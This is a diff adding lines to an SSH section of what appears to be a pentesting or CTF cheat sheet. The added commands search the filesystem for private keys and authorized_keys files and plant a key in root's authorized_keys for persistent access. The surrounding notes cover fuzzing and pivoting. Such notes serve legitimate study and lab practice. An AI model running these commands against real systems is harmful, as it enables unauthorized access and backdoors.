@@ -8,6 +8,11 @@
   - `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u [ssh://10.10.10.10/FUZZ](ssh://10.10.10.10/FUZZ)`
 - SSH keys
   - `ssh -i id_rsa username@10.10.10.10`
+  - `find / -name authorized_keys 2>/dev/null`
+  - `find / -name id_rsa 2>/dev/null`
+  - `ssh-keygen -f key`
+  - `echo "ssh-rsa sshkeytext user@domain" >> /root/.ssh/authorized_keys`
+    - `ssh root@10.10.10.10 -i key`
 - when connecting to ssh do ss -tulpn to see what socket connections are running
 - SSH is great for pivoting
   - Port Forwarding
